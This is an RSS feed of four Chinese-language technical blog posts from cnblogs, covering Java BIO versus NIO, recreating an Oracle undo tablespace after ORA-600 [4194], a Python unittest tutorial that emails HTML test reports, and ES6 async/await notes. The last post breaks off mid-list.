<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="css/feed.xsl"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:media="http://search.yahoo.com/mrss/" xmlns:og="http://ogp.me/ns#">
<channel>
<atom:link rel="self" href="http://192.168.1.4/fivefilters/makefulltextfeed.php?url=feed.cnblogs.com%2Fblog%2Fsitehome%2Frss&amp;max=10&amp;links=preserve&amp;exc=" />
<atom:link rel="alternate" title="Source URL" href="http://feed.cnblogs.com/blog/sitehome/rss" />
<atom:link rel="related" title="Subscribe to feed" href="http://www.subtome.com/#/subscribe?feeds=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D&amp;back=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D" />
<title>博客园_首页</title>
<link></link>
<description>代码改变世界</description>
<item>
<title>IO 和 NIO 的思考 - wskwbog</title>
<link>http://www.cnblogs.com/wskwbog/p/10539782.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/wskwbog/p/10539782.html</guid>
<description>&lt;p&gt;输入输出是操作系统不可或缺的一部分，大致分为两类：面向磁盘和面向网络。在 Java 中有3种 I/O 类型：BIO、NIO 和 AIO，分别是同步阻塞、同步非阻塞和异步非阻塞 I/O，这里着重描述 BIO 和 NIO 的区别和常用的编程模型。&lt;/p&gt;
&lt;h2 id=&quot;为什么设计-nio&quot;&gt;1. 为什么设计 NIO&lt;/h2&gt;
&lt;p&gt;一个直接原因就是为了更好的利用操作系统特性，改善和扩展原有 API。与 NIO 相关的规范有两个：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://jcp.org/en/jsr/detail?id=51&quot;&gt;JSR 51&lt;/a&gt;：它是 NIO 的第一个规范，关注缓冲区、通道和字符集的设计，引入一个简单的面向缓冲区的 I/O 模型，并且提供一套非阻塞、I/O 多路复用、可扩展的 API&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://jcp.org/en/jsr/detail?id=203&quot;&gt;JSR 203(NIO.2)&lt;/a&gt;：它在前者的基础上，添加新的文件系统的抽象，完善现有 Socket 通道的配置，添加多播数据报的支持，并且定义了一个异步 I/O 编程 API&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;那么，传统的 BIO 又有什么弊端？NIO 又是如何改进的？可以从两方面进行说明。&lt;/p&gt;
&lt;h3 id=&quot;文件操作&quot;&gt;1.2 文件操作&lt;/h3&gt;
&lt;p&gt;关于 java.io.file，它的不足之处在于：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;查询文件属性时，如修改时间或文件类型，都会发生系统调用，并且这些组合操作非常常见，造成性能问题&lt;/li&gt;
&lt;li&gt;部分方法在发生错误时返回 false 而不是抛出异常，比如 delete、rename，不知操作失败的原因&lt;/li&gt;
&lt;li&gt;一些 OS 高级功能不支持，比如符号链接、文件锁定、内存映射等&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;而 NIO 支持批量获取文件属性，对文件、目录的处理也重新设计，提供 FileLock、MappedByteBuffer 等支持 OS 高级功能。&lt;/p&gt;
&lt;h3 id=&quot;网络通信&quot;&gt;1.3 网络通信&lt;/h3&gt;
&lt;p&gt;BIO 是同步阻塞、基于流的 I/O，阻塞就意味着当 Socket 输入流中无数据可读取时，调用线程挂起，直到有数据读取，期间不能处理其他请求，如果来了一个新连接，就只能再新建一个线程处理。&lt;/p&gt;
&lt;p&gt;随着连接数的增加，BIO 将会创建大量线程，而一个计算机能打开的进程数或线程数是有限的，严重的时候可能会导致应用崩溃无响应。一个有效的解决办法是使用线程池，限制最大线程数，但它同时也限制了最大连接数。&lt;/p&gt;
&lt;p&gt;NIO 将读写改为非阻塞，无数据可读，线程返回线程池，可用于处理其他连接。它对原始 I/O 提供了新的抽象 - Channel（通道），并且提供基于缓冲区的读写 API。Channel 表示一个到硬件设备、文件或网络套接字的连接，与 java.net.Socket 的区别是：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;可配置非阻塞，允许&lt;strong&gt;事件驱动&lt;/strong&gt;的设计，提供了一种更加可扩展的服务器开发&lt;/li&gt;
&lt;li&gt;面向缓冲区，可实现&lt;strong&gt;零拷贝&lt;/strong&gt;执行 I/O ，只不过有一端必须是 FileChannel&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;相同环境下，BIO 的线程全程只处理一条连接，而 NIO 的线程可处理多个连接，提高了系统的吞吐能力。NIO 在服务器进行纵向扩展（比如增加内存、CPU）或者横向扩展（比如增加服务器）往往能够比 BIO 带来更高的处理能力，使服务器具有更强的可扩展性和可伸缩性。&lt;/p&gt;
&lt;h3 id=&quot;零拷贝&quot;&gt;1.4 零拷贝&lt;/h3&gt;
&lt;p&gt;NIO 还有一个零拷贝的概念，零拷贝是指 CPU 不执行将数据从一个存储区复制到另一个存储区的操作。OS 级别的零拷贝指的是将数据发送到硬件驱动程序（网卡或磁盘驱动器）时避免从一个位置&lt;strong&gt;复制&lt;/strong&gt;到另一个位置（一般是从用户空间到内核空间），反之亦然。NIO 中的零拷贝就是这样，只不过它只针对在网络上发送文件。&lt;/p&gt;
&lt;h2 id=&quot;io-模型的选择&quot;&gt;2. I/O 模型的选择&lt;/h2&gt;
&lt;p&gt;一般的，我们潜意识的会认为 NIO 比 BIO 的性能高，其实不尽然，当然了有个读取方式的问题，read(byte[]) 和 read(ByteBuffer)应该没区别吧？所以如果系统的并发量不高，两个用谁都行。&lt;/p&gt;
&lt;p&gt;BIO 的问题通常会在海量的连接下体现出来，由于它不能充分利用、压榨一台服务器的性能，不管怎么扩展，它能处理的连接数与机器性能往往是非线性的，付出和收获不成正比。如果你的应用面临的连接不断增加，特别是存在大量的长连接，此时就要选择 NIO，它不仅提高了单机处理能力，还能节省服务器成本。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;NIO 相比 BIO 的重点在于可扩展性&lt;/strong&gt;，在选择 I/O 模型时，需要结合业务场景，综合考虑以下几点：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;预计最大的并发数&lt;/li&gt;
&lt;li&gt;短连接还是长连接&lt;/li&gt;
&lt;li&gt;预计每个连接的数据量，即流量的大小&lt;/li&gt;
&lt;li&gt;NIO 灵活，但代价是编程复杂&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;编程模型&quot;&gt;3. 编程模型&lt;/h2&gt;
&lt;p&gt;BIO 的编程模型是一连接一处理线程，采用线程池优化。&lt;/p&gt;
&lt;p&gt;NIO 典型的编程模型是 &lt;strong&gt;Reactor&lt;/strong&gt;，事件复用器通知套接字何时准备好读取和写入操作的事件，将事件传递给合适的处理程序，由该程序负责实际的读取或写入。对于读操作基本过程如下：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;处理程序声明感兴趣的 I/O 事件 - 读取事件&lt;/li&gt;
&lt;li&gt;事件复用器等待事件&lt;/li&gt;
&lt;li&gt;一个事件发生，复用器被唤醒并调用适当的处理程序&lt;/li&gt;
&lt;li&gt;处理程序执行实际的读取操作，处理读取的数据，重新声明关注的 I/O 事件，并将控制权返回给调度程序&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;与 Reactor 相对的还有一个 AIO 的 &lt;strong&gt;Proactor&lt;/strong&gt; 模型，它是&lt;strong&gt;异步 I/O&lt;/strong&gt;，事件复用器等待 I/O 操作完成的事件，它是真正的异步，因为实际的 I/O 操作完全由操作系统执行。对于读操作，它的做法是：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;处理程序启动异步读取操作，在这种情况下，处理程序不关心 I/O 就绪事件，而是关注接收完成的事件&lt;/li&gt;
&lt;li&gt;事件复用器等待操作完成&lt;/li&gt;
&lt;li&gt;当事件复用器等待时，OS 并行的在内核线程中执行读操作，将数据放入用户定义的缓冲区，读取完成后通知事件多路复用器&lt;/li&gt;
&lt;li&gt;事件复用器调用适当的处理程序&lt;/li&gt;
&lt;li&gt;处理程序处理用户定义缓冲区的数据，启动新的异步操作，并将控制返回给事件多路复用器&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;小结&quot;&gt;4. 小结&lt;/h2&gt;
&lt;p&gt;I/O 模型经常对比的是阻塞和非阻塞，还有同步和异步，在《UNIX 网络编程》第6章已经给出了它们的区别，并且给出的图示很直观。这里简单做下说明，以 UDP 为例，读取一个数据包可以分为两个阶段：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;第一阶段：应用进程发起系统调用，内核无数据包准备好，等待数据&lt;/li&gt;
&lt;li&gt;第二阶段：数据包准备好，OS 将数据从内核复制到用户空间&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;阻塞和非阻塞描述的是第一阶段无数据可读取时线程是否挂起；同步和异步描述的是第二阶段，在数据复制过程中线程是否参与和挂起。注意 NIO/BIO 都是同步 I/O，NIO 对应 UNP 中描述的 I/O 复用模型。&lt;/p&gt;
</description>
<pubDate>Wed, 17 Apr 2019 23:37:00 +0000</pubDate>
<dc:creator>wskwbog</dc:creator>
<og:description>输入输出是操作系统不可或缺的一部分，大致分为两类：面向磁盘和面向网络。在 Java 中有3种 I/O 类型：BIO、NIO 和 AIO，分别是同步阻塞、同步非阻塞和异步非阻塞 I/O，这里着重描述 B</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/wskwbog/p/10539782.html</dc:identifier>
</item>
<item>
<title>Oracle创建新undo表空间最佳实践(包含段检查) - AlfredZhao</title>
<link>http://www.cnblogs.com/jyzhao/p/10727336.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/jyzhao/p/10727336.html</guid>
<description>&lt;p&gt;在处理一则ORA-600 [4194]案例时，参考MOS文档：Step by step to resolve ORA-600 4194 4193 4197 on database crash (文档 ID 1428786.1)&lt;/p&gt;

&lt;pre&gt;
&lt;code&gt;The following error is occurring in the alert.log right before the database crashes.
ORA-00600: internal error code, arguments: [4194], [#], [#], [], [], [], [], []
 
This error indicates that a mismatch has been detected between redo records and rollback (undo) records.

ARGUMENTS:

Arg [a] - Maximum Undo record number in Undo block
Arg [b] - Undo record number from Redo block

Since we are adding a new undo record to our undo block, we would expect that the new record number is equal to the maximum record number in the undo block plus one. Before Oracle can add a new undo record to the undo block it validates that this is correct. If this validation fails, then an ORA-600 [4194] will be triggered.&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;可以看到，此错误是因为redo和undo的记录不匹配。常见于异常断电等场景。&lt;/p&gt;

&lt;p&gt;Best practice to create a new undo tablespace.&lt;br/&gt;his method includes segment check.&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;1. Create pfile from spfile to edit
SQL&amp;gt; Create pfile='/tmp/initsid.ora' from spfile;

2. Shutdown the instance

3. set the following parameters in the pfile /tmp/initsid.ora
    undo_management = manual
    event = '10513 trace name context forever, level 2'

4. SQL&amp;gt;&amp;gt;startup restrict pfile='/tmp/initsid.ora'

5. SQL&amp;gt;select tablespace_name, status, segment_name from dba_rollback_segs where status != 'OFFLINE';

This is critical - we are looking for all undo segments to be offline - System will always be online.

If any are 'PARTLY AVAILABLE' or 'NEEDS RECOVERY' - Please open an issue with Oracle Support or update the current SR.  There are many options from this moment and Oracle Support Analyst can offer different solutions for the bad undo segments.

If all offline then continue to the next step

6. Create new undo tablespace - example
SQL&amp;gt;create undo tablespace &amp;lt;new undo tablespace&amp;gt; datafile &amp;lt;datafile&amp;gt; size 2000M;

7. Drop old undo tablespace
SQL&amp;gt;drop tablespace &amp;lt;old undo tablespace&amp;gt; including contents and datafiles;

8. SQL&amp;gt;shutdown immediate;

9 SQL&amp;gt;startup nomount;  --&amp;gt; Using your Original spfile

10. Modify the spfile with the new undo tablespace name

SQL&amp;gt; Alter system set undo_tablespace = '&amp;lt;new tablespace created in step 6&amp;gt;' scope=spfile;

11. SQL&amp;gt;shutdown immediate;

12. SQL&amp;gt;startup;  --&amp;gt; Using spfile&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;相关随笔参考：&lt;/strong&gt;&lt;/p&gt;
</description>
<pubDate>Wed, 17 Apr 2019 21:50:00 +0000</pubDate>
<dc:creator>AlfredZhao</dc:creator>
<og:description>在处理一则ORA 600 [4194]案例时，参考MOS文档：Step by step to resolve ORA 600 4194 4193 4197 on database crash (文档</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/jyzhao/p/10727336.html</dc:identifier>
</item>
<item>
<title>Python3+unitest自动化测试初探（中篇） - 秦无殇</title>
<link>http://www.cnblogs.com/webDepOfQWS/p/10725194.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/webDepOfQWS/p/10725194.html</guid>
<description>&lt;hr/&gt;&lt;p&gt;本篇随笔承接：Python3+unitest自动化测试初探（上篇）&lt;/p&gt;
&lt;p&gt;地址：&lt;a href=&quot;https://www.cnblogs.com/webDepOfQWS/p/10707299.html&quot; target=&quot;_blank&quot;&gt;Python3+unitest自动化测试初探（上篇）&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;生成测试报告&quot;&gt;6、生成测试报告&lt;/h3&gt;
&lt;h4 id=&quot;下载htmltestrunner.py&quot;&gt;6.1、下载HTMLTestRunner.py&lt;/h4&gt;
&lt;p&gt;原版下载地址：http://tungwaiyip.info/software/HTMLTestRunner.html&lt;br/&gt;原版的只支持Python 2.x版本，Python 3.x版本需要做适配&lt;/p&gt;
&lt;p&gt;适配后的下载地址：https://github.com/Slience007/pyunitest/blob/master/untils/HTMLTestRunner.py&lt;/p&gt;
&lt;h4 id=&quot;安装htmltestrunner.py&quot;&gt;6.2、安装HTMLTestRunner.py&lt;/h4&gt;
&lt;p&gt;安装方法比较简单，将HTMLTestRunner.py放到sys.path路径下即可。ubuntu下，我放到了如下路径：/usr/lib/python3.7。&lt;/p&gt;
&lt;h4 id=&quot;生成报告&quot;&gt;6.3、生成报告&lt;/h4&gt;
&lt;p&gt;HTMLTestRunner.py提供HTMLTestRunner()类来代替unittest.TextTestRunner()执行用例，修改后的run.py的代码如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;#coding:utf-8
import  unittest
#导入HTMLTestRunner
from HTMLTestRunner import  HTMLTestRunner
#从testCase包里面导入测试类
from testCases.userLoginTest import loginTest
from testCases.userRegTest import regTest

#构造测试套
def suite():
    suite = unittest.TestSuite()
    suite.addTest(loginTest(&quot;test_loginsucess_L0&quot;))
    suite.addTest(loginTest(&quot;test_pwdwrong_L0&quot;))
    suite.addTest(loginTest(&quot;test_statuserr_L1&quot;))
    suite.addTest(regTest(&quot;test_pwdlenerr_L1&quot;))
    suite.addTest(regTest(&quot;test_regsucess_L0&quot;))
    suite.addTest(regTest(&quot;test_regagain_L1&quot;))
    return suite

#运行测试用例
if __name__ == '__main__':
    # runner = unittest.TextTestRunner()
    # #调用test runner的run方法执行用例
    # runner.run(suite())
    #以二进制格式打开TestReport.html用于写入数据
    with open(&quot;./TestReport.html&quot;,&quot;wb&quot;) as f:
        runner = HTMLTestRunner(stream=f,title=&quot;Reg And Login Test Report&quot;)
        runner.run(suite())
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;运行run.py后，打开TestReport.html，查看生成的测试报告。&lt;br/&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/631850/201904/631850-20190417175736649-1163701788.png&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;编写邮件发送工具&quot;&gt;7、编写邮件发送工具&lt;/h3&gt;
&lt;p&gt;在Project下新建包utils用来封装一些常用的工具，在utils下新建Python文件emailUtil.py。定义sendEmail类。这个类主要包含3个方法：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;&lt;strong&gt;init&lt;/strong&gt;()：初始化&lt;/li&gt;
&lt;li&gt;writeEmail()：构造邮件主题，邮件正文，添加邮件附件。&lt;/li&gt;
&lt;li&gt;sendEmail()：连接邮件服务器，认证，发送邮件。我采用的是网易邮件服务器，其地址是smtp.126.com。收件地址为QQ邮箱。&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;[ 代码如下：]emailUtil.py&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;#coding:utf-8
'''
email模块负责构造邮件内容
smtplib模块负责发送邮件
'''
from email.mime.text import  MIMEText
from email.mime.multipart import MIMEMultipart
import smtplib
from email.header import Header

class sendEmail():
    #定义全局变量邮件服务器地址，登录用户，授权码
    global MAILHOST,MAILUSER,MAILPWD
    MAILHOST = &quot;smtp.126.com&quot;
    MAILUSER = &quot;××××@126.com&quot;
    MAILPWD = &quot;×××&quot;

    def __init__(self,subject,content,reveiver,attachPath=&quot;&quot;):
        self.subject = subject
        self.content = content
        self.receiver = reveiver
        self.attachPath = attachPath
    #写邮件,返回msg.as_string()
    def writeEmail(self):
        msg = MIMEMultipart()
        #邮件正文
        msg.attach(MIMEText(self.content, 'plain', 'utf8'))
        receiverName = &quot;,&quot;.join(self.receiver)
        msg['from'] = Header(MAILUSER,'utf-8')
        #msg['to'] =  Header(&quot;,&quot;.join(self.receiver)).encode()
        msg['to'] = Header(receiverName).encode()
        #邮件主题
        msg['Subject'] = Header(self.subject,'utf-8').encode()
        #print(&quot;msg is:&quot;,msg)
        #attachPath不为空则添加附件到邮件中
        if self.attachPath != &quot;&quot;:
            with open(self.attachPath, 'rb') as f:
                attach1  = MIMEText(f.read(), 'base64', 'utf-8')
                attach1[&quot;Content-Type&quot;] = 'application/octet-stream'
                #filename可以随便写
                attach1[&quot;Content-Disposition&quot;] = 'attachment; filename=&quot;Result.html&quot;'
                msg.attach(attach1)

        return msg.as_string()

    #发送邮件
    def sendEmail(self):
        receiver = &quot;;&quot;.join(self.receiver)
        try:
            #连接邮件服务器
            server = smtplib.SMTP()
            server.connect(MAILHOST,25)
            #打开debug模式可以看到握手过程
            #server.set_debuglevel(1)
            #登录，MAILPWD为网易邮件的授权码
            server.login(MAILUSER,MAILPWD)
            #发送邮件
            server.sendmail(MAILUSER,receiver,self.writeEmail())
            server.quit()
            print(&quot;Email send sucess.&quot;)
        except Exception as  e:
            print(&quot;Email send fail.&quot;)
            print(e)
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;在编写邮件工具的时候，碰到了一个错误：smtplib.SMTPDataError: (554, b'DT:SPM。原因可能是：邮件被网易邮件服务器当成了垃圾邮件。解决办法：邮件主题不能包含test，另外msg[from&quot;]，msg['to']要和server.sendmail(MAILUSER,receiver,self.writeEmail())中的MAILUSER和receiver保持一致。&lt;/p&gt;
&lt;h3 id=&quot;发送邮件&quot;&gt;8、发送邮件&lt;/h3&gt;
&lt;p&gt;在发送邮件之前，先获取本次执行用例总数，失败用例数，成功用例数，跳过的用例数。并计算出用例通过率。&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;suite().countTestCases()：获取用例总数。&lt;/li&gt;
&lt;li&gt;runner.run(suite()).success_count：运行通过的用例数。&lt;/li&gt;
&lt;li&gt;runner.run(suite()).failure_count：失败的用例数。&lt;/li&gt;
&lt;li&gt;runner.run(suite()).skipped：返回的是跳过的用例list。&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;接下来来修改run.py ，需要先从utils模块导入sendEmail类，构造主题，邮件正文，指定收件人列表，指定测试报告的路径，之后调用sendEmail方法发送邮件。修改后的run.py代码如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;#coding:utf-8
import  unittest
#导入HTMLTestRunner
from HTMLTestRunner import  HTMLTestRunner
#从testCase包里面导入测试类
from testCases.userLoginTest import loginTest
from testCases.userRegTest import regTest

from utils.emailUtil import sendEmail
#构造测试套
def suite():
    suite = unittest.TestSuite()
    suite.addTest(loginTest(&quot;test_loginsucess_L0&quot;))
    suite.addTest(loginTest(&quot;test_pwdwrong_L0&quot;))
    suite.addTest(loginTest(&quot;test_statuserr_L1&quot;))
    suite.addTest(regTest(&quot;test_pwdlenerr_L1&quot;))
    suite.addTest(regTest(&quot;test_regsucess_L0&quot;))
    suite.addTest(regTest(&quot;test_regagain_L1&quot;))
    return suite

#运行测试用例
if __name__ == '__main__':
    # runner = unittest.TextTestRunner()
    # #调用test runner的run方法执行用例
    # runner.run(suite())
    #以二进制格式打开TestReport.html用于写入数据
    with open(&quot;./TestReport.html&quot;,&quot;wb&quot;) as f:
        runner = HTMLTestRunner(stream=f,title=&quot;Reg And Login Test Report&quot;)
        result = runner.run(suite())
        totalNums = suite().countTestCases()
        passedNums = result.success_count
        failedNums = result.failure_count
        skippedNums = len(result.skipped)
        #通过率，保留两位小数
        passRate = round(passedNums * 100/  totalNums)
        emailBody = &quot;Hi,all:\n \t本次构建一共运行：{totalNums}个用例，通过{passedNums}个，失败{failedNums}个，跳过{skippedNums}个。通过率：{passRate}%.\n \t详细信息请查看附件。&quot;
        content = emailBody.format(totalNums=totalNums,passedNums=passedNums,failedNums=failedNums,skippedNums=skippedNums,passRate=passRate)
        #收件人列表
        receiver = ['××××@qq.com',&quot;×××××@126.com&quot;]
        #测试报告的路径
        path1 = &quot;/home/stephen/PycharmProjects/unitTestDemo/TestReport.html&quot;
        subject = &quot;登录注册功能每日构建&quot;
        e = sendEmail(subject,content,receiver,attachPath=path1)
        #发送邮件
        e.sendEmail()
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;运行run.py。登录邮箱查看已经发送成功的邮件。&lt;br/&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/631850/201904/631850-20190418011426950-334200648.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/631850/201904/631850-20190418014630817-965270225.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://www.cnblogs.com/webDepOfQWS/p/10725194.html#jump&quot;&gt;&lt;em&gt;点击这里返回本篇目录&lt;/em&gt;&lt;/a&gt;&lt;/p&gt;
</description>
<pubDate>Wed, 17 Apr 2019 17:41:00 +0000</pubDate>
<dc:creator>秦无殇</dc:creator>
<og:description>使用HTMLTestRunner生成详细的测试报告，编写邮件发送工具，构造邮件正文，包含运行用例的总数，通过用例数，失败用例数并计算出通过率。发送用例运行结果邮件。附件为详细的测试报告。</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/webDepOfQWS/p/10725194.html</dc:identifier>
</item>
<item>
<title>es6学习笔记-async函数 - 热爱前端的17号诶</title>
<link>http://www.cnblogs.com/sqh17/p/10727156.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/sqh17/p/10727156.html</guid>
<description>&lt;h4 id=&quot;前情摘要&quot;&gt;1 前情摘要&lt;/h4&gt;
&lt;p&gt;前段时间时间进行项目开发，需求安排不是很合理，导致一直高强度的加班工作，这一个月不是常说的996，简直是936，还好熬过来了。在此期间不是刚学会了es6的promise，在项目有用到promise的就一直都在用promise，爽的不要不要的，哈哈，项目到了最终阶段，不是很忙了，就开始自己的学习之路，好啦，废话到此为止，开始～&lt;/p&gt;
&lt;h4 id=&quot;含义&quot;&gt;2 含义&lt;/h4&gt;
&lt;p&gt;关于异步操作，在es6之前，一直都是&lt;br/&gt;回调函数，&lt;br/&gt;事件监听，&lt;br/&gt;发布/订阅&lt;br/&gt;promise对象&lt;br/&gt;（摘自es6的Generator函数的异步应用），这四个为主，再加上es6出来的promise对象以及后来的Generator函数，都可以解决异步编程。es7引入的async函数，使得异步操作变得更加方便&lt;/p&gt;
&lt;p&gt;&lt;code&gt;async函数，就是Generator 函数的语法糖&lt;/code&gt;，基于Generator 函数而来的，只是为了书写代码时更加流畅，增强代码的可读性。&lt;code&gt;async的返回值就是个promise对象&lt;/code&gt;，进一步说，async函数完全可以看作多个异步操作，包装成的一个 Promise 对象，而await命令就是内部then命令的语法糖。&lt;/p&gt;
&lt;h4 id=&quot;基本语法&quot;&gt;3 基本语法&lt;/h4&gt;
&lt;p&gt;async函数返回一个 Promise 对象，可以使用then方法添加回调函数。当函数执行的时候，一旦遇到await就会先返回，等到异步操作完成，再接着执行函数体内后面的语句。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;async function demo(val) {
  let result = await `hello,${val}`;
  return result;
}
demo('peter').then((val)=&amp;gt;{console.log(`${val},哈哈哈哈`)}) // hello,peter,哈哈哈哈
console.log(demo('peter'))  // Promise{&amp;lt;pending&amp;gt;}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;上述就是async的最基本语法，这看起来和普通的函数没有什么区别，只是多了两个关键字async和await,以及返回的promise的实例。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;async&lt;br/&gt;是异步操作的说明，在普通函数名前面加上async代表了是一个异步操作，async函数返回一个 Promise 对象，async函数return语句返回的值，会成为then方法回调函数的参数&lt;/li&gt;
&lt;/ul&gt;&lt;pre class=&quot;javascript&quot;&gt;
&lt;code&gt;  async function f() {
       return 123
   }
   f().then(v =&amp;gt; console.log(v)) // 123&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;将当于&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;  async function f() {
      return await new Promise(function(resolve){
          resolve(123)
      })
  }
  f().then(v =&amp;gt; console.log(v)) // 123&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;也将当于&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;  async function f() {
    return await Promise.resolve('123')
  }
  f().then(v =&amp;gt; console.log(v))&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;将async的return的值作为参数传递给then函数。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;await&lt;br/&gt;await 可以理解为是 async wait 的简写。&lt;code&gt;await 必须出现在 async 函数内部，不能单独使用，否则会报错&lt;/code&gt;。&lt;/li&gt;
&lt;/ul&gt;&lt;pre class=&quot;javascript&quot;&gt;
&lt;code&gt;    function foo() {
       await 123;
    }
    foo(); //Uncaught SyntaxError: await is only valid in async function&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这就是没有在函数名前面声明async报的错，相反的，声明了async，没有使用await不会报错&lt;/p&gt;
&lt;p&gt;await 后面可以跟任何的JS 表达式。虽然说 await 可以是很多类型的东西，但是它最主要的意图是用来等待 Promise 对象的状态被 resolved。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;async function foo() {}// 函数声明&lt;/li&gt;
&lt;li&gt;const foo = async function () {};// 函数表达式&lt;/li&gt;
&lt;li&gt;let obj = { async foo() {} };&lt;br/&gt;obj.foo().then(...)// 对象的方法&lt;/li&gt;
&lt;li&gt;class Foo {// Class 的方法&lt;br/&gt;constructor() { }&lt;br/&gt;async foo(name) { }&lt;br/&gt;}&lt;/li&gt;
&lt;li&gt;const foo = async () =&amp;gt; {};// 箭头函数&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;code&gt;如果await的是promise对象会造成异步函数停止执行并且等待promise的解决,如果等的是正常的表达式则立即执行。&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;另外：await命令后面的 Promise 对象如果变为reject状态，则reject的参数会被catch方法的回调函数接收到。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;async function f() {
  await Promise.reject('出错了');
}

f()
.then(v =&amp;gt; console.log(v))
.catch(e =&amp;gt; console.log(e)) // 出错了&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;ps: &lt;code&gt;任何一个await语句后面的 Promise 对象变为reject状态，那么整个async函数都会中断执行。&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;async function f() {
  await Promise.reject('出错了');
  return await Promise.resolve('hello world');
}
f()
.then(v =&amp;gt; console.log(v))
.catch(e =&amp;gt; console.log(e)) // 出错了&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;上述代码在await的时候，实行了promise的reject方法，会直接终端执行，直接实行reject的方法&lt;/p&gt;
&lt;h4 id=&quot;错误处理异常处理&quot;&gt;4 错误处理／异常处理&lt;/h4&gt;
&lt;p&gt;防止出错的方法，也是将其放在try...catch代码块之中，这样又能实行剩下的部分。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;function time(ms){
  if(ms&amp;lt;3000){
    setTimeout(()=&amp;gt;{
      console.log('ms',ms)
      return ms
    },ms)
  }else{
    return Promise.reject('出错了')
  }
}
async function f() {
  try {
    let a = await time(1000)
    let b = await time(2000)
    let c = await time(3000)
  } catch(e) {
    console.log('e',e) // 'e' 出错了
  }
  return await('hello world');
}
f().then(val=&amp;gt;{
  console.log(val) // hello world
}).catch(val=&amp;gt;{
  console.log(val)
})&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;先报错‘出错了’，再‘hello world’ 再依次打印出‘1000’，‘2000’&lt;br/&gt;因为有了reject之后，就无法往下进行,但是最后return是返回一个resolve的值给then()&lt;/p&gt;
&lt;h4 id=&quot;注意点&quot;&gt;5 注意点&lt;/h4&gt;
&lt;p&gt;有的注意点上面已经提到了，先总结如下：&lt;/p&gt;
&lt;ul readability=&quot;12.5&quot;&gt;&lt;li&gt;await 必须出现在 async 函数内部，不能单独使用，否则会报错。&lt;/li&gt;
&lt;li&gt;await命令后面的Promise对象，运行结果可能是rejected，所以最好把await命令放在try...catch代码块中，多个await也是如此。&lt;/li&gt;
&lt;li readability=&quot;12&quot;&gt;
